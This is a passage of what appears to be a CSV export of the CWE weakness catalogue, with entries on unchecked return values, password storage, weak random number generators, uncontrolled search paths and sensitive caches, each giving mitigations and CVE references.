Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2000-0116:DESCRIPTION:Extra < in front of SCRIPT tag bypasses XSS prevention.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0116::REFERENCE:CVE-2001-1157:DESCRIPTION:Extra < in front of SCRIPT tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1157::REFERENCE:CVE-2002-2086:DESCRIPTION:<script - probably a cleansing error:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2086::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Extra Special Element::\",,\"\",\n252,\"Unchecked Return Value\",Base,Draft,\"The product does not check the return value from a method or function, which can prevent it from detecting unexpected states and conditions.\",\"Two common programmer assumptions are this function call can never fail and it doesn't matter if this function call fails. If an attacker can force the function to fail or otherwise return a value that is not expected, then the subsequent program logic could lead to a vulnerability, because the product is not in a state that the programmer assumes. For example, if the program calls a function to drop privileges but does not check the return code to ensure that privileges were successfully dropped, then the program will continue to operate with the higher privileges.\",::NATURE:ChildOf:CWE ID:754:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:754:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:476:VIEW ID:1000:CHAIN ID:690::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"::Many functions will return some value about the success of their actions. This will alert the program whether or not to handle any errors caused by that function.::\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Integrity:IMPACT:Unexpected State:IMPACT:DoS: Crash, Exit, or Restart:NOTE:An unexpected return value could place the system in a state that could lead to a crash or other unintended behaviors.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Check the results of all functions that return a value and verify that the value is expected.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:Ensure that you account for all possible return values from the function.::PHASE:Implementation:DESCRIPTION:When designing a function, make sure you return a value or throw an exception in case of an error.::\",\"::REFERENCE:CVE-2020-17533:DESCRIPTION:Chain: unchecked return value (CWE-252) of some functions for policy enforcement leads to authorization bypass (CWE-862):LINK:https://www.cve.org/CVERecord?id=CVE-2020-17533::REFERENCE:CVE-2020-6078:DESCRIPTION:Chain: The return value of a function returning a pointer is not checked for success (CWE-252) resulting in the later use of an uninitialized variable (CWE-456) and a null pointer dereference (CWE-476):LINK:https://www.cve.org/CVERecord?id=CVE-2020-6078::REFERENCE:CVE-2019-15900:DESCRIPTION:Chain: sscanf() call is used to check if a username and group exists, but the return value of sscanf() call is not checked (CWE-252), causing an uninitialized variable to be checked (CWE-457), returning success to allow authorization bypass for executing a privileged (CWE-863).:LINK:https://www.cve.org/CVERecord?id=CVE-2019-15900::REFERENCE:CVE-2007-3798:DESCRIPTION:Unchecked return value leads to resultant integer overflow and code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3798::REFERENCE:CVE-2006-4447:DESCRIPTION:Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4447::REFERENCE:CVE-2006-2916:DESCRIPTION:Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2916::REFERENCE:CVE-2008-5183:DESCRIPTION:chain: unchecked return value can lead to NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5183::REFERENCE:CVE-2010-0211:DESCRIPTION:chain: unchecked return value (CWE-252) leads to free of invalid, uninitialized pointer (CWE-824).:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0211::REFERENCE:CVE-2017-6964:DESCRIPTION:Linux-based device mapper encryption program does not check the return value of setuid and setgid allowing attackers to execute code with unintended privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-6964::REFERENCE:CVE-2002-1372:DESCRIPTION:Chain: Return values of file/socket operations are not checked (CWE-252), allowing resultant consumption of file descriptors (CWE-772).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1372::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Unchecked Return Value::TAXONOMY NAME:CLASP:ENTRY NAME:Ignored function return value::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A7:ENTRY NAME:Improper Error Handling:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ERR33-C:ENTRY NAME:Detect and handle standard library errors:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS54-C:ENTRY NAME:Detect and handle POSIX library errors:MAPPING FIT:Imprecise::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:EXP00-J:ENTRY NAME:Do not ignore values returned by methods::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:EXP32-PL:ENTRY NAME:Do not ignore function return values:MAPPING FIT:Exact::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-252-resource::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-CWE-252-data::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-CWE-252-resource::\",,\"\",\n253,\"Incorrect Check of Function Return Value\",Base,Incomplete,\"The product incorrectly checks a return value from a function, which prevents it from detecting errors or exceptional conditions.\",\"Important and common functions will return some value about the success of its actions. This will alert the program whether or not to handle any errors caused by that function.\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:754:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Integrity:IMPACT:Unexpected State:IMPACT:DoS: Crash, Exit, or Restart:NOTE:An unexpected return value could place the system in a state that could lead to a crash or other unintended behaviors.::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Language Selection:DESCRIPTION:Use a language or compiler that uses exceptions and requires the catching of those exceptions.::PHASE:Implementation:DESCRIPTION:Properly check all functions which return a value.::PHASE:Implementation:DESCRIPTION:When designing any function make sure you return a value or throw an exception in case of an error.::\",\"::REFERENCE:CVE-2023-49286:DESCRIPTION:Chain: function in web caching proxy does not correctly check a return value (CWE-253) leading to a reachable assertion (CWE-617):LINK:https://www.cve.org/CVERecord?id=CVE-2023-49286::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Misinterpreted function return value::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ERR33-C:ENTRY NAME:Detect and handle standard library errors:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS54-C:ENTRY NAME:Detect and handle POSIX library errors:MAPPING FIT:Imprecise::\",,\"\",\n256,\"Plaintext Storage of a Password\",Base,Incomplete,\"Storing a password in plaintext may result in a system compromise.\",\"Password management issues occur when a password is stored in plaintext in an application's properties, configuration file, or memory. Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource. In some contexts, even storage of a plaintext password in memory is considered a security risk if the password is not cleared immediately after it is used.\",::NATURE:ChildOf:CWE ID:522:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Architecture and Design:NOTE:Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this belief makes an attacker's job easier.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Avoid storing passwords in easily accessible locations.::PHASE:Architecture and Design:DESCRIPTION:Consider storing cryptographic hashes of passwords as an alternative to storing in plaintext.::PHASE::DESCRIPTION:A programmer might attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password because the encoding can be detected and decoded easily.:EFFECTIVENESS:None::\",\"::REFERENCE:CVE-2022-30275:DESCRIPTION:Remote Terminal Unit (RTU) uses a driver that relies on a password stored in plaintext.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30275::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Password Management::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 1.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 1.5::\",,\"\",\n257,\"Storing Passwords in a Recoverable Format\",Base,Incomplete,\"The storage of passwords in a recoverable format makes them subject to password reuse attacks by malicious users. In fact, it should be noted that recoverable encrypted passwords provide no significant benefit over plaintext passwords since they are subject not only to reuse by malicious attackers but also by malicious insiders. If a system administrator can recover a password directly, or use a brute force search on the available information, the administrator can use the password on other accounts.\",\"\",::NATURE:ChildOf:CWE ID:522:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:259:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:User's passwords may be revealed.::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:Revealed passwords may be reused elsewhere to impersonate the users in question.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Use strong, non-reversible encryption to protect stored passwords.::\",\"::REFERENCE:CVE-2022-30018:DESCRIPTION:A messaging platform serializes all elements of User/Group objects, making private information available to adversaries:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30018::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Storing passwords in a recoverable format::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",::49::,\"::TYPE:Maintenance:NOTE:The meaning of this entry needs to be investigated more closely, especially with respect to what is meant by recoverable.::\",\n338,\"Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)\",Base,Draft,\"The product uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong.\",\"When a non-cryptographic PRNG is used in a cryptographic context, it can expose the cryptography to certain types of attacks. Often a pseudo-random number generator (PRNG) is not designed for cryptography. Sometimes a mediocre source of randomness is sufficient or preferable for algorithms that use random numbers. Weak generators generally take less processing power and/or do not use the precious, finite, entropy sources on a system. While such PRNGs might have very useful features, these same features could be used to break the cryptography.\",::NATURE:ChildOf:CWE ID:330:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:330:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If a PRNG is used for authentication and authorization, such as a session ID or a seed for generating a cryptographic key, then an attacker may be able to easily guess the ID or cryptographic key and gain access to restricted functionality.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Use functions or hardware which use a hardware-based random number generation for all crypto. This is the recommended solution. Use CyptGenRandom on Windows, or hw_rand() on Linux.::\",\"::REFERENCE:CVE-2021-3692:DESCRIPTION:PHP framework uses mt_rand() function (Marsenne Twister) when generating tokens:LINK:https://www.cve.org/CVERecord?id=CVE-2021-3692::REFERENCE:CVE-2009-3278:DESCRIPTION:Crypto product uses rand() library function to generate a recovery key, making it easier to conduct brute force attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-3278::REFERENCE:CVE-2009-3238:DESCRIPTION:Random number generator can repeatedly generate the same value.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-3238::REFERENCE:CVE-2009-2367:DESCRIPTION:Web application generates predictable session IDs, allowing session hijacking.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2367::REFERENCE:CVE-2008-0166:DESCRIPTION:SSL library uses a weak random number generator that only generates 65,536 unique keys.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0166::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Non-cryptographic PRNG::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MSC30-C:ENTRY NAME:Do not use the rand() function for generating pseudorandom numbers:MAPPING FIT:CWE More Abstract::\",,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\",\n341,\"Predictable from Observable State\",Base,Draft,\"A number or object is predictable based on observations that the attacker can make about the state of the system or network, such as time, process ID, etc.\",\"\",::NATURE:ChildOf:CWE ID:340:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context:NOTE:This weakness could be exploited by an attacker in a number ways depending on the context. If a predictable number is used to generate IDs or keys that are used within protection mechanisms, then an attacker could gain unauthorized access to the system. If predictable filenames are used for storing sensitive information, then an attacker might gain access to the system and may be able to gain access to the information in the file.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Increase the entropy used to seed a PRNG.::PHASE:Architecture and Design Requirements:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (Approved Random Number Generators).::PHASE:Implementation:DESCRIPTION:Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.::\",\"::REFERENCE:CVE-2002-0389:DESCRIPTION:Mail server stores private mail messages with predictable filenames in a world-executable directory, which allows local users to read private mailing list archives.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0389::REFERENCE:CVE-2001-1141:DESCRIPTION:PRNG allows attackers to use the output of small PRNG requests to determine the internal state information, which could be used by attackers to predict future pseudo-random numbers.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1141::REFERENCE:CVE-2000-0335:DESCRIPTION:DNS resolver library uses predictable IDs, which allows a local attacker to spoof DNS query results.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0335::REFERENCE:CVE-2005-1636:DESCRIPTION:MFV. predictable filename and insecure permissions allows file modification to execute SQL queries.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1636::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Predictable from Observable State::\",,\"::TYPE:Maintenance:NOTE:As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, randomness is used heavily. However, within cryptography, entropy is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.::\",\n427,\"Uncontrolled Search Path Element\",Base,Draft,\"The product uses a fixed or controlled search path to find resources, but one or more locations in that path can be under the control of unintended actors.\",\"Although this weakness can occur with any type of resource, it is frequently introduced when a product uses a directory search path to find executables or code libraries, but the path contains a directory that can be modified by an attacker, such as /tmp or the current working directory. In Windows-based systems, when the LoadLibrary or LoadLibraryEx function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled: the directory from which the program has been loaded the current working directory In some cases, the attack can be conducted remotely, such as when SMB or WebDAV network shares are used. One or more locations in that path could include the Windows drive root or its subdirectories. This often exists in Linux-based code assuming the controlled nature of the root directory (/) or its subdirectories (/etc, etc), or a code that recursively accesses the parent directory. In Windows, the drive root and some of its subdirectories have weak permissions by default, which makes them uncontrolled. In some Unix-based systems, a PATH might be created that contains an empty element, e.g. by splicing an empty variable into the PATH. This empty element can be interpreted as equivalent to the current working directory, which might be an untrusted search element. In software package management frameworks (e.g., npm, RubyGems, or PyPi), the framework may identify dependencies on third-party libraries or other packages, then consult a repository that contains the desired package. The framework may search a public repository before a private repository. This could be exploited by attackers by placing a malicious package in the public repository that has the same name as a package from the private repository. The search path might not be directly under control of the developer relying on the framework, but this search order effectively contains an untrusted element.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:668:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"::TERM:DLL preloading:DESCRIPTION:This term is one of several that are used to describe exploitation of untrusted search path elements in Windows systems, which received wide attention in August 2010. From a weakness perspective, the term is imprecise because it can apply to both CWE-426 and CWE-427.::TERM:Binary planting:DESCRIPTION:This term is one of several that are used to describe exploitation of untrusted search path elements in Windows systems, which received wide attention in August 2010. From a weakness perspective, the term is imprecise because it can apply to both CWE-426 and CWE-427.::TERM:Insecure library loading:DESCRIPTION:This term is one of several that are used to describe exploitation of untrusted search path elements in Windows systems, which received wide attention in August 2010. From a weakness perspective, the term is imprecise because it can apply to both CWE-426 and CWE-427.::TERM:Dependency confusion:DESCRIPTION:As of February 2021, this term is used to describe CWE-427 in the context of managing installation of software package dependencies, in which attackers release packages on public sites where the names are the same as package names used by private repositories, and the search for the dependent package tries the public site first, downloading untrusted code. It may also be referred to as a substitution attack.::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Hard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such as CWE-426 and CWE-428.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:When invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Remove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths.::PHASE:Implementation:DESCRIPTION:Check your search path before use and remove any elements that are likely to be unsafe, such as the current working directory or a temporary files directory. Since this is a denylist approach, it might not be a complete solution.::PHASE:Implementation:DESCRIPTION:Use other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of finding the program using the PATH environment variable, while execl() and execv() require a full path.::\",\"::REFERENCE:CVE-2023-25815:DESCRIPTION:chain: a change in an underlying package causes the gettext function to use implicit initialization with a hard-coded path (CWE-1419) under the user-writable C: drive, introducing an untrusted search path element (CWE-427) that enables spoofing of messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2023-25815::REFERENCE:CVE-2022-4826:DESCRIPTION:Go-based git extension on Windows can search for and execute a malicious ..exe in a repository because Go searches the current working directory if git.exe is not found in the PATH:LINK:https://www.cve.org/CVERecord?id=CVE-2022-4826::REFERENCE:CVE-2020-26284:DESCRIPTION:A Static Site Generator built in Go, when running on Windows, searches the current working directory for a command, possibly allowing code execution using a malicious .exe or .bat file with the name being searched:LINK:https://www.cve.org/CVERecord?id=CVE-2020-26284::REFERENCE:CVE-2022-24765:DESCRIPTION:Windows-based fork of git creates a .git folder in the C: drive, allowing local attackers to create a .git folder with a malicious config file:LINK:https://www.cve.org/CVERecord?id=CVE-2022-24765::REFERENCE:CVE-2019-1552:DESCRIPTION:SSL package searches under C:/usr/local for configuration files and other critical data, but C:/usr/local might be world-writable.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-1552::REFERENCE:CVE-2010-3402:DESCRIPTION:DLL hijacking issue in document editor.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3402::REFERENCE:CVE-2010-3397:DESCRIPTION:DLL hijacking issue in encryption software.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3397::REFERENCE:CVE-2010-3138:DESCRIPTION:DLL hijacking issue in library used by multiple media players.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3138::REFERENCE:CVE-2010-3152:DESCRIPTION:DLL hijacking issue in illustration program.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3152::REFERENCE:CVE-2010-3147:DESCRIPTION:DLL hijacking issue in address book.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3147::REFERENCE:CVE-2010-3135:DESCRIPTION:DLL hijacking issue in network monitoring software.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3135::REFERENCE:CVE-2010-3131:DESCRIPTION:DLL hijacking issue in web browser.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-3131::REFERENCE:CVE-2010-1795:DESCRIPTION:DLL hijacking issue in music player/organizer.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1795::REFERENCE:CVE-2002-1576:DESCRIPTION:Product uses the current working directory to find and execute a program, which allows local users to gain privileges by creating a symlink that points to a malicious version of the program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1576::REFERENCE:CVE-1999-1461:DESCRIPTION:Product trusts the PATH environmental variable to find and execute a program, which allows local users to obtain root access by modifying the PATH to point to a malicous version of that program.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1461::REFERENCE:CVE-1999-1318:DESCRIPTION:Software uses a search path that includes the current working directory (.), which allows local users to gain privileges via malicious programs.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1318::REFERENCE:CVE-2003-0579:DESCRIPTION:Admin software trusts the user-supplied -uv.install command line option to find and execute the uv.install program, which allows local users to gain privileges by providing a pathname that is under control of the user.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0579::REFERENCE:CVE-2000-0854:DESCRIPTION:When a document is opened, the directory of that document is first used to locate DLLs , which could allow an attacker to execute arbitrary commands by inserting malicious DLLs into the same directory as the document.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0854::REFERENCE:CVE-2001-0943:DESCRIPTION:Database trusts the PATH environment variable to find and execute programs, which allows local users to modify the PATH to point to malicious programs.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0943::REFERENCE:CVE-2001-0942:DESCRIPTION:Database uses an environment variable to find and execute a program, which allows local users to execute arbitrary programs by changing the environment variable.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0942::REFERENCE:CVE-2001-0507:DESCRIPTION:Server uses relative paths to find system files that will run in-process, which allows local users to gain privileges via a malicious file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0507::REFERENCE:CVE-2002-2017:DESCRIPTION:Product allows local users to execute arbitrary code by setting an environment variable to reference a malicious program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2017::REFERENCE:CVE-1999-0690:DESCRIPTION:Product includes the current directory in root's PATH variable.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0690::REFERENCE:CVE-2001-0912:DESCRIPTION:Error during packaging causes product to include a hard-coded, non-standard directory in search path.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0912::REFERENCE:CVE-2001-0289:DESCRIPTION:Product searches current working directory for configuration file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0289::REFERENCE:CVE-2005-1705:DESCRIPTION:Product searches current working directory for configuration file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1705::REFERENCE:CVE-2005-1307:DESCRIPTION:Product executable other program from current working directory.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1307::REFERENCE:CVE-2002-2040:DESCRIPTION:Untrusted path.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2040::REFERENCE:CVE-2005-2072:DESCRIPTION:Modification of trusted environment variable leads to untrusted path vulnerability.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2072::REFERENCE:CVE-2005-1632:DESCRIPTION:Product searches /tmp for modules before other paths.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1632::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Uncontrolled Search Path Element::\",::38::471::,\"::TYPE:Relationship:NOTE:Unlike untrusted search path (CWE-426), which inherently involves control over the definition of a control sphere (i.e., modification of a search path), this entry concerns a fixed control sphere in which some part of the sphere may be under attacker control (i.e., the search path cannot be modified by an attacker, but one element of the path can be under attacker control).::TYPE:Theoretical:NOTE:This weakness is not a clean fit under CWE-668 or CWE-610, which suggests that the control sphere model might need enhancement or clarification.::\",\n524,\"Use of Cache Containing Sensitive Information\",Base,Incomplete,\"The code uses a cache that contains sensitive information, but the cache can be read by an actor outside of the intended control sphere.\",\"Applications may use caches to improve efficiency when communicating with remote entities or performing intensive calculations. A cache maintains a pool of objects, threads, connections, pages, financial data, passwords, or other resources to minimize the time it takes to initialize and access these resources. If the cache is accessible to unauthorized actors, attackers can read the cache and obtain this sensitive information.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and 